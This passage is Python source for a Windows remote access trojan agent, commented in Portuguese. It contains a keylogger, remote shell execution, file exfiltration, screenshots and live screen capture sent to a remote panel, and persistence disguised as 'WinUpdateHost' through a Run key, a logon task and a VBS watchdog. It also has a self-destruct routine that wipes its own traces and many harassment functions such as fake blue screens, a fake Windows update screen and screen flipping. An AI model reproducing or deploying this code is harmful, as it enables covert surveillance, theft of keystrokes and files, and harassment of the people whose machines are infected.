    return "taskbar visivel" if show else "taskbar escondida"


def troll_error(text="O Windows encontrou um problema.", title="Erro do sistema"):
    u = _win()

    def runner():
        try:
            u.MessageBoxW(0, str(text), str(title), 0x10)
        except Exception:
            pass
    threading.Thread(target=runner, daemon=True).start()
    return "erro falso exibido"


def troll_susto(seconds=8):
    """Combo: esconde o cursor, treme, bipa e solta um erro falso."""
    troll_cursor(seconds)
    troll_shake(seconds)
    troll_beep(2)
    troll_error("Falha critica no driver de video.\nCodigo 0x000000EA", "Erro fatal")
    return "susto completo por %ds" % max(1, int(seconds or 8))


# ------------------------------------------------------- trolls novos (rodada 2)
def _devmode():
    buf = ctypes.create_string_buffer(220)
    if not _win().EnumDisplaySettingsW(None, -1, buf):
        return None
    return buf


def _set_orientation(buf, orient, w, h):
    """Grava a orientacao no DEVMODE e aplica (0=normal 1=90 2=180 3=270)."""
    import struct
    struct.pack_into("<H", buf, 68, 220)                      # dmSize
    struct.pack_into("<I", buf, 72,
                     0x00000080 | 0x00080000 | 0x00100000 | 0x00000020)
    struct.pack_into("<ii", buf, 76, 0, 0)                    # dmPosition
    struct.pack_into("<I", buf, 84, orient)                   # dmDisplayOrientation
    if orient in (1, 3):
        struct.pack_into("<I", buf, 172, h)
        struct.pack_into("<I", buf, 176, w)
    else:
        struct.pack_into("<I", buf, 172, w)
        struct.pack_into("<I", buf, 176, h)
    return _win().ChangeDisplaySettingsExW(None, buf, None, 0, None)


def troll_flip(mode="180", seconds=0):
    """Vira a tela do alvo (180 = de cabeca pra baixo) e devolve no fim."""
    import struct
    u = _win()
    buf = _devmode()
    if buf is None:
        return "[!] nao consegui ler o video"
    w0 = struct.unpack_from("<I", buf.raw, 172)[0]
    h0 = struct.unpack_from("<I", buf.raw, 176)[0]
    o0 = struct.unpack_from("<I", buf.raw, 84)[0]
    orient = {"90": 1, "180": 2, "270": 3, "normal": 0, "0": 0}.get(str(mode).lower(), 2)
    rc = _set_orientation(buf, orient, w0, h0)
    if rc != 0:
        return "[!] driver recusou girar a tela (codigo %d)" % rc
    secs = int(seconds or 0)
    if secs > 0:
        def runner():
            time.sleep(secs)
            # restaurar de primeira nem sempre pega: insiste ate voltar
            for _ in range(8):
                _set_orientation(buf, o0, w0, h0)
                time.sleep(0.7)
                chk = _devmode()
                if chk is None:
                    continue
                if struct.unpack_from("<I", chk.raw, 84)[0] == o0:
                    return
        threading.Thread(target=runner, daemon=True).start()
    return "tela em %s graus" % mode


def troll_fix_all():
    """Desfaz tudo que os trolls mexem (botao de panico)."""
    import struct
    feitos = []
    try:
        buf = _devmode()
        if buf is not None:
            w0 = struct.unpack_from("<I", buf.raw, 172)[0]
            h0 = struct.unpack_from("<I", buf.raw, 176)[0]
            if struct.unpack_from("<I", buf.raw, 84)[0] != 0:
                _set_orientation(buf, 0, w0, h0)
                feitos.append("tela")
    except Exception:
        pass
    try:
        if _win().GetKeyState(0x14) & 1:
            _win().keybd_event(0x14, 0, 0, 0)
            _win().keybd_event(0x14, 0, 2, 0)
            feitos.append("capslock")
    except Exception:
        pass
    try:
        _win().ClipCursor(None)
        _win().SystemParametersInfoW(0x0057, 0, None, 0)
        feitos.append("cursor")
    except Exception:
        pass
    try:
        troll_mouse_speed(False)
        feitos.append("mouse")
    except Exception:
        pass
    try:
        troll_taskbar(True)
        feitos.append("taskbar")
    except Exception:
        pass
    try:
        close_placa()
        feitos.append("placa")
    except Exception:
        pass
    return "revertido: " + (", ".join(feitos) if feitos else "nada pendente")


def troll_caps(seconds=30, on=True):
    """Prende o CapsLock ligado (ou desligado) por N segundos."""
    u = _win()
    secs = max(1, int(seconds or 30))

    def runner():
        end = time.time() + secs
        while time.time() < end:
            ligado = bool(u.GetKeyState(0x14) & 1)
            if ligado != bool(on):
                u.keybd_event(0x14, 0, 0, 0)
                u.keybd_event(0x14, 0, 2, 0)
            time.sleep(0.35)
    threading.Thread(target=runner, daemon=True).start()
    return "capslock %s por %ds" % ("ligado" if on else "desligado", secs)


def troll_volume(level="max"):
    """Volume no talo (ou zerado) na marra."""
    u = _win()
    alto = str(level).lower() not in ("zero", "0", "mudo", "min")
    vk = 0xAF if alto else 0xAE
    for _ in range(50):
        u.keybd_event(vk, 0, 0, 0)
        u.keybd_event(vk, 0, 2, 0)
    return "volume no maximo" if alto else "volume zerado"


def troll_siren(seconds=10):
    """Sirene alternando dois tons ate o alvo enlouquecer."""
    try:
        import winsound
    except Exception:
        return "[!] winsound indisponivel"
    secs = max(1, int(seconds or 10))

    def runner():
        end = time.time() + secs
        i = 0
        while time.time() < end:
            try:
                winsound.Beep(900 if i % 2 == 0 else 1600, 200)
            except Exception:
                pass
            i += 1
    threading.Thread(target=runner, daemon=True).start()
    return "sirene por %ds" % secs


def troll_mouse_speed(fast=True):
    """Sensibilidade do mouse no maximo (ou de volta ao normal)."""
    u = _win()
    if fast:
        u.SystemParametersInfoW(0x0071, 0, ctypes.c_void_p(20), 0)
        accel = (ctypes.c_int * 3)(1, 3, 2)
        u.SystemParametersInfoW(0x0004, 0, accel, 0)
        return "mouse com sensibilidade no maximo"
    u.SystemParametersInfoW(0x0071, 0, ctypes.c_void_p(10), 0)
    accel = (ctypes.c_int * 3)(6, 10, 1)
    u.SystemParametersInfoW(0x0004, 0, accel, 0)
    return "mouse normal"


def troll_window_shake(seconds=5):
    """Faz a janela em foco tremer na tela."""
    u = _win()
    hwnd = u.GetForegroundWindow()
    if not hwnd:
        return "[!] nenhuma janela ativa"
    r = _RECT()
    u.GetWindowRect(hwnd, ctypes.byref(r))
    x0, y0 = r.left, r.top
    secs = max(1, int(seconds or 5))

    def runner():
        end = time.time() + secs
        try:
            while time.time() < end:
                u.SetWindowPos(hwnd, 0, x0 + random.randint(-28, 28),
                               y0 + random.randint(-28, 28), 0, 0, 0x0001 | 0x0004)
                time.sleep(0.03)
        finally:
            u.SetWindowPos(hwnd, 0, x0, y0, 0, 0, 0x0001 | 0x0004)
    threading.Thread(target=runner, daemon=True).start()
    return "janela tremendo por %ds" % secs


def troll_notepad_storm(n=8):
    """Abre um monte de notepads."""
    n = max(1, min(30, int(n or 8)))
    abertos = 0
    for _ in range(n):
        try:
            subprocess.Popen(["notepad.exe"], creationflags=0x08000000)
            abertos += 1
        except Exception:
            break
        time.sleep(0.2)
    return "%d notepads abertos" % abertos


def _solid_bmp(path, rgb, w=1920, h=1080):
    """BMP 24 bits de cor solida (sem PIL)."""
    import struct
    r, g, b = rgb
    row = bytes((b, g, r)) * w
    pad = (4 - (w * 3) % 4) % 4
    row += b"\x00" * pad
    data = row * h
    hdr = b"BM" + struct.pack("<IHHI", 54 + len(data), 0, 0, 54)
    info = struct.pack("<IiiHHIIiiII", 40, w, h, 1, 24, 0, len(data),
                       2835, 2835, 0, 0)
    with open(path, "wb") as f:
        f.write(hdr + info + data)
    return path


def troll_wallpaper(color="#7a0010", restore=False):
    """Troca o papel de parede por uma cor solida."""
    u = _win()
    if restore:
        u.SystemParametersInfoW(0x0014, 0, "", 3)
        return "papel de parede restaurado"
    c = str(color or "#7a0010").lstrip("#")
    try:
        rgb = (int(c[0:2], 16), int(c[2:4], 16), int(c[4:6], 16))
    except Exception:
        rgb = (122, 0, 16)
    try:
        path = os.path.join(INSTALL_DIR, "wall.bmp")
        _solid_bmp(path, rgb)
    except Exception as exc:
        return "[!] %s" % exc
    u.SystemParametersInfoW(0x0014, 0, path, 3)
    return "papel de parede trocado para %s" % (color or "#7a0010")


def troll_desktop_icons():
    """Mostra/esconde os icones da area de trabalho."""
    u = _win()
    h = u.FindWindowW("Progman", None)
    if not h:
        return "[!] area de trabalho nao encontrada"
    u.SendMessageW(h, 0x0111, 0x7402, 0)
    return "icones da area de trabalho alternados"


def troll_cursor_size(size=256, restore=False):
    """Cursor gigante (best effort: alguns drivers so aplicam no logoff)."""
    try:
        import winreg
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Cursors",
                           0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "CursorBaseSize", 0, winreg.REG_DWORD,
                          32 if restore else int(size))
        winreg.CloseKey(k)
    except Exception as exc:
        return "[!] %s" % exc
    _win().SystemParametersInfoW(0x0057, 0, None, 0)
    return "cursor normal" if restore else "cursor gigante"


def troll_clip_garbage():
    """Enche o clipboard com lixo."""
    txt = "".join(random.choice("ABCDEFGHJKLMNPQRSTUVWXYZ0123456789 ")
                  for _ in range(600))
    clip_set(txt)
    return "clipboard entupido (%d caracteres)" % len(txt)


def troll_bsod(seconds=25):
    """Tela azul da morte falsa em tela cheia."""
    txt = (":(\n\nSeu PC encontrou um problema e precisa reiniciar.\n"
           "Estamos apenas coletando algumas informacoes de erro e\n"
           "reiniciaremos para voce.\n\n0% concluido")
    show_placa(txt, seconds, "#0a2a6b", "#ffffff")
    return "bsod falso por %ds" % max(1, int(seconds or 25))


def troll_blackout(seconds=10):
    """Tela toda preta."""
    show_placa("", seconds, "#000000", "#000000")
    return "tela apagada por %ds" % max(1, int(seconds or 10))


def troll_fake_update(seconds=30):
    """Janela de 'atualizando o Windows' que nunca termina."""
    txt = ("Atualizando o Windows\n\n"
           "Nao desligue o computador.\n\n"
           "Isso pode levar algum tempo.\n\n0% concluido")
    show_placa(txt, seconds, "#0b1a33", "#ffffff")
    return "atualizacao falsa por %ds" % max(1, int(seconds or 30))


# -------------------------------------------------------------------- keylogger
_SHIFTED = {
    "1": "!", "2": "@", "3": "#", "4": "$", "5": "%", "6": "^", "7": "&",
    "8": "*", "9": "(", "0": ")", "-": "_", "=": "+", "[": "{", "]": "}",
    "\\": "|", ";": ":", "'": '"', ",": "<", ".": ">", "/": "?", "`": "~",
}

_NAMED = {
    0x08: "[BACK]", 0x09: "[TAB]", 0x0A: "[LF]", 0x0D: "[ENTER]", 0x1B: "[ESC]",
    0x20: " ", 0x21: "[PGUP]", 0x22: "[PGDN]", 0x23: "[END]", 0x24: "[HOME]",
    0x25: "[LEFT]", 0x26: "[UP]", 0x27: "[RIGHT]", 0x28: "[DOWN]", 0x2C: "[PRTSC]",
    0x2D: "[INS]", 0x2E: "[DEL]", 0x5B: "[WIN]", 0x5C: "[RWIN]", 0x14: "[CAPS]",
    0x90: "[NUMLOCK]", 0x91: "[SCROLL]",
}

_VK_BASE = {
    0xBA: ";", 0xBB: "=", 0xBC: ",", 0xBD: "-", 0xBE: ".", 0xBF: "/",
    0xC0: "`", 0xDB: "[", 0xDC: "\\", 0xDD: "]", 0xDE: "'",
}


def _vk_char(vk):
    try:
        u = ctypes.windll.user32
        shift = bool(u.GetAsyncKeyState(0x10) & 0x8000)
        caps = bool(u.GetKeyState(0x14) & 1)
    except Exception:
        shift, caps = False, False

    if 0x41 <= vk <= 0x5A:                                  # A-Z
        ch = chr(vk)
        return ch if (shift ^ caps) else ch.lower()
    if 0x30 <= vk <= 0x39:                                  # 0-9
        ch = chr(vk)
        return _SHIFTED.get(ch, ch) if shift else ch
    if 0x60 <= vk <= 0x69:                                  # numpad
        return str(vk - 0x60)
    if vk in _NAMED:
        return _NAMED[vk]
    base = _VK_BASE.get(vk)
    if base:
        return _SHIFTED.get(base, base) if shift else base
    return ""


class _Keylogger(threading.Thread):
    def __init__(self):
        super().__init__(daemon=True)
        self._buf = []
        self._lock = threading.Lock()
        self._stop = threading.Event()

    def run(self):
        if not IS_WIN:
            return
        u = ctypes.windll.user32
        down = set()
        while not self._stop.is_set():
            for vk in range(8, 256):
                if u.GetAsyncKeyState(vk) & 0x8000:
                    if vk in down:
                        continue
                    down.add(vk)
                    ch = _vk_char(vk)
                    if ch:
                        with self._lock:
                            self._buf.append(ch)
                else:
                    down.discard(vk)
            time.sleep(0.01)

    def stop(self):
        self._stop.set()

    def dump(self):
        with self._lock:
            data = "".join(self._buf)
            self._buf = []
        return data or "(no keystrokes captured)"


# ------------------------------------------------------------------ persistence
RUN_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
VALUE_NAME = "WinUpdateHost"
TASK_NAME = "WinUpdateHostTask"
INSTALL_DIR = os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")), "Microsoft", "WinUpdateHost")


def _agent_args():
    """Argumentos completos do agente.

    Sem --http o agente cai em modo TCP local e nunca aparece no painel: era
    exatamente isso que deixava o site vazio com o processo vivo.
    """
    parts = ["--host", str(HOST), "--port", str(PORT), "--key", _key_str()]
    if HTTP_BASE:
        parts += ["--http", HTTP_BASE]
    if BOOTSTRAP:
        parts += ["--bootstrap", BOOTSTRAP]
    return " ".join(parts)


def _key_str():
    """Chave em uso agora (a do argv vence a que veio embutida no payload)."""
    k = _KEY
    if isinstance(k, bytes):
        k = k.decode("utf-8", "replace")
    return k or KEY


def _launch_cmd(target):
    if getattr(sys, "frozen", False):
        return '"%s"' % target
    exe = sys.executable
    if exe.lower().endswith("python.exe"):
        cand = exe[:-10] + "pythonw.exe"
        if os.path.exists(cand):
            exe = cand
    return '"%s" "%s"' % (exe, target)


def install():
    """Copy the payload to %APPDATA% and register Run key + logon task."""
    if not IS_WIN:
        return "[!] persistence requires Windows"
    import winreg

    frozen = getattr(sys, "frozen", False)
    src = sys.executable if frozen else os.path.abspath(__file__)
    ext = ".exe" if frozen else ".py"
    os.makedirs(INSTALL_DIR, exist_ok=True)
    dst = os.path.join(INSTALL_DIR, "wuhost" + ext)

    if os.path.abspath(src).lower() != os.path.abspath(dst).lower():
        shutil.copy2(src, dst)

    cmd = _launch_cmd(dst) + " " + _agent_args()

    with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, RUN_KEY, 0, winreg.KEY_SET_VALUE) as k:
        winreg.SetValueEx(k, VALUE_NAME, 0, winreg.REG_SZ, cmd)

    task = subprocess.run(
        'schtasks /create /tn %s /tr "%s" /sc onlogon /f' % (TASK_NAME, cmd),
        shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
    )
    task_ok = task.returncode == 0

    return ("installed -> %s\nrun key : HKCU\\%s\\%s\nlogon task: %s"
            % (dst, RUN_KEY, VALUE_NAME, "ok" if task_ok else "failed"))


def uninstall():
    if not IS_WIN:
        return "[!] persistence requires Windows"
    import winreg

    notes = []
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY, 0, winreg.KEY_SET_VALUE) as k:
            winreg.DeleteValue(k, VALUE_NAME)
        notes.append("run key removed")
    except Exception as exc:
        notes.append("run key: %s" % exc)

    task = subprocess.run("schtasks /delete /tn %s /f" % TASK_NAME, shell=True,
                          stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    notes.append("task: %s" % ("removed" if task.returncode == 0 else "not present"))

    try:
        if os.path.isdir(INSTALL_DIR):
            shutil.rmtree(INSTALL_DIR, ignore_errors=True)
            notes.append("files removed")
    except Exception:
        pass
    return "\n".join(notes)


def selfdestruct(delay=2):
    """Remove persistence, wipe every copy of this payload, then kill the process."""
    notes = []
    try:
        notes.append(uninstall())
    except Exception as exc:
        notes.append("uninstall: %s" % exc)

    me = os.path.abspath(sys.argv[0])
    targets = [me, _payload_dir()]
    tmp = tempfile.gettempdir()
    try:
        for name in os.listdir(tmp):
            if name.startswith(("raf_frame_", "raf_scr_")):
                targets.append(os.path.join(tmp, name))
    except OSError:
        pass

    if getattr(sys, "frozen", False):
        try:
            ctypes.windll.kernel32.MoveFileExW(me, None, 0x4)   # MOVEFILE_DELAY_UNTIL_REBOOT
        except Exception:
            pass

    lines = ["@echo off", 'cd /d "%TEMP%"', "timeout /t %d /nobreak >nul" % int(delay)]
    for t in targets:
        if os.path.isdir(t):
            lines.append('rmdir /s /q "%s" 2>nul' % t)
        else:
            lines.append('del /f /q "%s" 2>nul' % t)
    lines.append('del /f /q "%~f0" 2>nul')

    bat = os.path.join(tmp, "raf_cleanup_%d.bat" % int(time.time()))
    with open(bat, "w", encoding="utf-8", newline="") as f:
        f.write("\r\n".join(lines) + "\r\n")

    subprocess.Popen(["cmd", "/c", bat], creationflags=0x00000008, close_fds=True,
                     stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    notes.append("wiped %d path(s); process exiting" % len(targets))
    return "\n".join(notes)


# -------------------------------------------------------------------- file xfer
def send_file(sock, rid, path):
    try:
        with open(path, "rb") as f:
            data = f.read()
    except Exception as exc:
        send(sock, {"t": "result", "id": rid, "ok": False, "out": "[!] %s" % exc})
        return
    send(sock, {
        "t": "result", "id": rid, "ok": True,
        "out": "%d bytes" % len(data),
        "file": os.path.basename(path), "size": len(data),
    })
    seq = 0
    for off in range(0, len(data), _CHUNK):
        send(sock, {"t": "chunk", "id": rid, "seq": seq,
                    "data": base64.b64encode(data[off:off + _CHUNK]).decode()})
        seq += 1
    send(sock, {"t": "chunk_end", "id": rid})


def _send_b64(sock, rid, path, limit=6 * 1024 * 1024):
    """Manda o arquivo inteiro em base64 dentro do resultado.

    O painel publicado no Render nao consegue ler os arquivos da sessao HTTP
    (o /api/frame so olha sessoes TCP), entao a tela ao vivo pede a imagem
    embutida e monta um data: URL no navegador -- sem depender de deploy.
    """
    try:
        if os.path.getsize(path) > limit:
            send(sock, {"t": "result", "id": rid, "ok": False,
                        "out": "[!] arquivo grande demais (%d bytes)" % os.path.getsize(path)})
            return
        with open(path, "rb") as f:
            data = base64.b64encode(f.read()).decode("ascii")
        send(sock, {"t": "result", "id": rid, "ok": True, "b64": True, "out": data})
    except Exception as exc:
        send(sock, {"t": "result", "id": rid, "ok": False, "out": "[!] %s" % exc})


def recv_upload(sock, rid, path):
    data = bytearray()
    while True:
        m = recv(sock)
        t = m.get("t")
        if t == "chunk":
            data += base64.b64decode(m.get("data", ""))
        elif t == "chunk_end":
            break
        elif t == "cmd":
            send(sock, {"t": "result", "id": m.get("id"), "ok": False,
                        "out": "[!] upload aborted by new command"})
            return
    try:
        parent = os.path.dirname(os.path.abspath(path))
        if parent:
            os.makedirs(parent, exist_ok=True)
        with open(path, "wb") as f:
            f.write(data)
        send(sock, {"t": "result", "id": rid, "ok": True,
                    "out": "wrote %d bytes -> %s" % (len(data), os.path.abspath(path))})
    except Exception as exc:
        send(sock, {"t": "result", "id": rid, "ok": False, "out": "[!] %s" % exc})


# -------------------------------------------------------------------- dispatch
def dispatch(sock, rid, op, args):
    def ok(text):
        send(sock, {"t": "result", "id": rid, "ok": True, "out": str(text)})

    if op == "ping":
        return ok("pong")

    if op in ("ver", "version", "versao"):
        return ok("agente v%s | pid %d | %s" % (
            AGENT_VER, os.getpid(),
            "exe" if getattr(sys, "frozen", False) else "py"))

    if op == "sysinfo":
        return ok(json.dumps(sysinfo(), indent=2))

    if op == "shell":
        return ok(run_shell(args.get("cmd", "")))

    if op == "cd":
        target = os.path.expanduser(args.get("path") or "~")
        os.chdir(target)
        STATE["cwd"] = os.getcwd()
        return ok(STATE["cwd"])

    if op == "pwd":
        return ok(STATE["cwd"])

    if op == "ls":
        return ok(list_dir(args.get("path")))

    if op == "download":
        return send_file(sock, rid, args.get("path", ""))

    if op == "upload":
        if args.get("data_b64") is not None:
            raw = base64.b64decode(args.get("data_b64") or "")
            path = args.get("path") or "upload.bin"
            try:
                parent = os.path.dirname(os.path.abspath(path))
                if parent:
                    os.makedirs(parent, exist_ok=True)
                with open(path, "wb") as f:
                    f.write(raw)
                return ok("wrote %d bytes -> %s" % (len(raw), os.path.abspath(path)))
            except Exception as exc:
                return ok("[!] %s" % exc)
        return recv_upload(sock, rid, args.get("path", ""))

    if op == "screenshot":
        path, note = screenshot()
        if not path:
            send(sock, {"t": "result", "id": rid, "ok": False, "out": note})
            return
        if args.get("b64"):
            _send_b64(sock, rid, path)
            try:
                os.remove(path)
            except OSError:
                pass
            return
        send_file(sock, rid, path)
        try:
            os.remove(path)
        except OSError:
            pass
        return

    if op == "frame":
        path, note = capture_jpeg(args.get("width", 1280), args.get("quality", 55))
        if not path:
            send(sock, {"t": "result", "id": rid, "ok": False, "out": note})
            return
        if args.get("b64"):
            _send_b64(sock, rid, path)
            try:
                os.remove(path)
            except OSError:
                pass
            return
        send_file(sock, rid, path)
        try:
            os.remove(path)
        except OSError:
            pass
        return

    if op == "placa":
        action = (args.get("action") or "show").lower()
        if action in ("off", "close", "hide"):
            return ok(close_placa())
        return ok(show_placa(args.get("text", ""), args.get("seconds", 0),
                             args.get("bg", "#000000"), args.get("fg", "#ff2d2d")))

    if op == "msg":
        return ok(show_msg(args.get("text", ""), args.get("title", "Aviso")))

    if op == "troll":
        a = (args.get("action") or "").lower()
        try:
            secs = int(args.get("seconds") or 0)
        except (TypeError, ValueError):
            secs = 0
        if a in ("cursor", "hide_cursor", "esconder"):
            return ok(troll_cursor(secs or 30))
        if a in ("show_cursor", "cursor_on"):
            return ok(troll_cursor_show())
        if a in ("lock", "travar"):
            return ok(troll_lock(secs or 20))
        if a in ("shake", "tremer"):
            return ok(troll_shake(secs or 6))
        if a in ("swap", "inverter"):
            return ok(troll_swap())
        if a in ("block", "bloquear"):
            return ok(troll_block(secs or 10))
        if a in ("tray", "bandeja"):
            return ok(troll_tray(args.get("state") or "open"))
        if a in ("monitor", "monitor_off"):
            return ok(troll_monitor(True))
        if a == "monitor_on":
            return ok(troll_monitor(False))
        if a in ("beep", "som"):
            return ok(troll_beep(secs or 3))
        if a in ("mute", "mudo"):
            return ok(troll_mute())
        if a in ("taskbar", "taskbar_hide"):
            return ok(troll_taskbar(False))
        if a == "taskbar_show":
            return ok(troll_taskbar(True))
        if a in ("error", "erro"):
            return ok(troll_error(args.get("text") or "O Windows encontrou um problema.",
                                  args.get("title") or "Erro do sistema"))
        if a in ("susto", "scare"):
            return ok(troll_susto(secs or 8))
        if a in ("flip", "virar", "girar180"):
            return ok(troll_flip("180", secs))
        if a in ("spin", "girar90"):
            return ok(troll_flip("90", secs))
        if a in ("spin270", "girar270"):
            return ok(troll_flip("270", secs))
        if a in ("normal", "endireitar"):
            return ok(troll_flip("normal", 0))
        if a in ("fix", "reverter", "panic"):
            return ok(troll_fix_all())
        if a in ("caps", "capslock"):
            return ok(troll_caps(secs or 30, True))
        if a in ("caps_off", "capslock_off"):
            return ok(troll_caps(secs or 30, False))
        if a in ("volume_max", "volume"):
            return ok(troll_volume("max"))
        if a in ("volume_zero", "volume_mute"):
            return ok(troll_volume("zero"))
        if a in ("siren", "sirene"):
            return ok(troll_siren(secs or 10))
        if a in ("mouse_fast", "mouse_louco"):
            return ok(troll_mouse_speed(True))
        if a in ("mouse_normal", "mouse_ok"):
            return ok(troll_mouse_speed(False))
        if a in ("window_shake", "tremer_janela"):
            return ok(troll_window_shake(secs or 5))
        if a in ("notepad", "notepad_storm"):
            return ok(troll_notepad_storm(args.get("count") or 8))
        if a in ("wallpaper", "papel"):
            return ok(troll_wallpaper(args.get("color") or "#7a0010"))
        if a in ("wallpaper_restore", "papel_ok"):
            return ok(troll_wallpaper(restore=True))
        if a in ("desktop_icons", "icones"):
            return ok(troll_desktop_icons())
        if a in ("cursor_big", "cursor_grande"):
            return ok(troll_cursor_size(256))
        if a in ("cursor_normal", "cursor_tamanho_ok"):
            return ok(troll_cursor_size(restore=True))
        if a in ("clip_garbage", "clipboard_lixo"):
            return ok(troll_clip_garbage())
        if a in ("bsod", "tela_azul"):
            return ok(troll_bsod(secs or 25))
        if a in ("blackout", "tela_preta"):
            return ok(troll_blackout(secs or 10))
        if a in ("fake_update", "atualizando"):
            return ok(troll_fake_update(secs or 30))
        if not a or a in ("list", "acoes", "help"):
            return ok("agente v%s\na\u00e7oes: cursor | show_cursor | lock | shake | "
                      "swap | block | tray | monitor | monitor_on | beep | mute | "
                      "taskbar | taskbar_show | error | susto | flip | spin | "
                      "normal | fix | caps | caps_off | volume_max | volume_zero | "
                      "siren | mouse_fast | mouse_normal | window_shake | notepad | "
                      "wallpaper | wallpaper_restore | desktop_icons | cursor_big | "
                      "cursor_normal | clip_garbage | bsod | blackout | fake_update"
                      % AGENT_VER)
        # acao que este binario nao conhece = exe antigo rodando no alvo
        return ok("[!] a\u00e7\u00e3o desconhecida: %s (agente v%s) -- esse agente "
                  "esta desatualizado, troque o exe" % (a, AGENT_VER))

    if op == "keylog":
        action = (args.get("action") or "dump").lower()
        if action == "start":
            inst = _KEYLOG["inst"]
            if inst and inst.is_alive():
                return ok("keylogger already running")
            inst = _Keylogger()
            inst.start()
            _KEYLOG["inst"] = inst
            return ok("keylogger started")
        if action == "stop":
            inst = _KEYLOG["inst"]
            if not inst:
                return ok("keylogger not running")
            inst.stop()
            data = inst.dump()
            _KEYLOG["inst"] = None
            return ok("keylogger stopped\n" + data)
        inst = _KEYLOG["inst"]
        return ok(inst.dump() if inst else "(keylogger not running)")

    if op == "clip":
        if (args.get("action") or "get").lower() == "set":
            return ok(clip_set(args.get("text", "")))
        return ok(clip_get())

    if op == "wallpaper":
        return ok(set_wallpaper(args.get("path", "")))

    if op == "power":
        return ok(power(args.get("action", "")))

    if op == "selfdestruct":
        notes = selfdestruct()
        ok("autodestruição armada\n" + notes)
        time.sleep(0.3)
        os._exit(0)

    if op == "persist":
        return ok(install())

    if op == "unpersist":
        return ok(uninstall())

    if op == "ps":
        return ok(process_list())

    if op == "kill":
        pid = int(args.get("pid", 0) or 0)
        if pid <= 0:
            return ok("[!] invalid pid")
        if IS_WIN:
            return ok(run_shell("taskkill /PID %d /F" % pid))
        try:
            os.kill(pid, 9)
            return ok("killed %d" % pid)
        except Exception as exc:
            return ok("[!] %s" % exc)

    if op == "sleep":
        STATE["sleep"] = max(0, int(args.get("seconds", 0) or 0))
        return ok("reconnect delay set to %ss" % STATE["sleep"])

    if op == "exit":
        ok("agent exiting")
        time.sleep(0.2)
        os._exit(0)

    return ok("[!] unknown op: %s" % op)


def serve(sock):
    while True:
        msg = recv(sock)
        if msg.get("t") != "cmd":
            continue
        rid = msg.get("id")
        op = msg.get("op")
        args = msg.get("args") or {}
        try:
            dispatch(sock, rid, op, args)
        except Exception as exc:
            try:
                send(sock, {"t": "result", "id": rid, "ok": False, "out": "[!] %s" % exc})
            except Exception:
                raise


# ------------------------------------------------------------------------ main
def parse_args(argv):
    host, port, key = HOST, PORT, KEY
    i = 0
    while i < len(argv):
        a = argv[i]
        if a in ("--host", "-H") and i + 1 < len(argv):
            host = argv[i + 1]
            i += 2
        elif a in ("--port", "-p") and i + 1 < len(argv):
            port = int(argv[i + 1])
            i += 2
        elif a in ("--key", "-k") and i + 1 < len(argv):
            key = argv[i + 1]
            i += 2
        else:
            i += 1
    return host, port, key


def _watchdog_running():
    """Ja existe um keep.vbs rodando? Evita vigia duplicado a cada restart."""
    if not IS_WIN:
        return False
    try:
        out = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command",
             "(Get-CimInstance Win32_Process -Filter \"Name='wscript.exe'\" | "
             "Where-Object { $_.CommandLine -like '*keep.vbs*' } | "
             "Measure-Object).Count"],
            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True,
            creationflags=0x08000000, timeout=40)
        return int((out.stdout or "0").strip().splitlines()[-1] or 0) > 0
    except Exception:
        return False


def _watchdog_vbs():
    """Escreve o vigia que ressube o agente 60s depois de qualquer morte."""
    import winreg

    exe = os.path.join(INSTALL_DIR, "wuhost.exe")
    if not os.path.exists(exe):
        exe = sys.executable if getattr(sys, "frozen", False) else os.path.join(INSTALL_DIR, "wuhost.py")
    vbs = os.path.join(INSTALL_DIR, "keep.vbs")

    args = "--host %s --port %d --key %s" % (HOST, PORT, _key_str())
    if HTTP_BASE:
        args += " --http %s" % HTTP_BASE
    if BOOTSTRAP:
        args += " --bootstrap %s" % BOOTSTRAP
    full = '"%s" %s' % (exe, args)

    body = (
        'On Error Resume Next\r\n'
        'Dim sh, fso, cmd, tmp, f\r\n'
        'Set sh = CreateObject("WScript.Shell")\r\n'
        'Set fso = CreateObject("Scripting.FileSystemObject")\r\n'
        'cmd = "%s"\r\n'
        'tmp = sh.ExpandEnvironmentStrings("%%TEMP%%") & "\\raf_proc.txt"\r\n'
        'Do\r\n'
        '  If fso.FileExists("%s") Then\r\n'
        '    If Not Rodando() Then sh.Run cmd, 0, False\r\n'
        '  End If\r\n'
        '  WScript.Sleep 20000\r\n'
        'Loop\r\n'
        'Function Rodando()\r\n'
        '  Dim ex, txt\r\n'
        '  Rodando = False\r\n'
        '  On Error Resume Next\r\n'
        '  sh.Run "cmd /c tasklist /fi ""imagename eq %s"" /nh > """ & tmp & """", 0, True\r\n'
        '  If fso.FileExists(tmp) Then\r\n'
        '    Set f = fso.OpenTextFile(tmp, 1)\r\n'
        '    txt = LCase(f.ReadAll)\r\n'
        '    f.Close\r\n'
        '    If InStr(txt, "%s") > 0 Then Rodando = True\r\n'
        '  End If\r\n'
        'End Function\r\n'
    ) % (full.replace('"', '""'), exe, os.path.basename(exe), os.path.basename(exe))

    with open(vbs, "w", encoding="utf-8") as f:
        f.write(body)
    with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, RUN_KEY, 0, winreg.KEY_SET_VALUE) as k:
        winreg.SetValueEx(k, "RAFHost", 0, winreg.REG_SZ, 'wscript.exe "%s"' % vbs)
    if not _watchdog_running():
        subprocess.Popen(["wscript.exe", vbs], creationflags=0x08000000,
                         stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL, close_fds=True)
    return vbs


def _kill_duplicates():
    """Mata copias antigas do agente.

    Duas instancias com o mesmo id disputam a fila do servidor: uma pega o
    comando e a outra responde, e o painel fica esperando ate 120s. Com um
    processo so, a resposta volta em ~0,5s.
    """
    if not IS_WIN:
        return
    me = os.getpid()
    try:
        subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command",
             "Get-Process wuhost,vcredist_x86 -ErrorAction SilentlyContinue | "
             "Where-Object { $_.Id -ne %d } | Stop-Process -Force" % me],
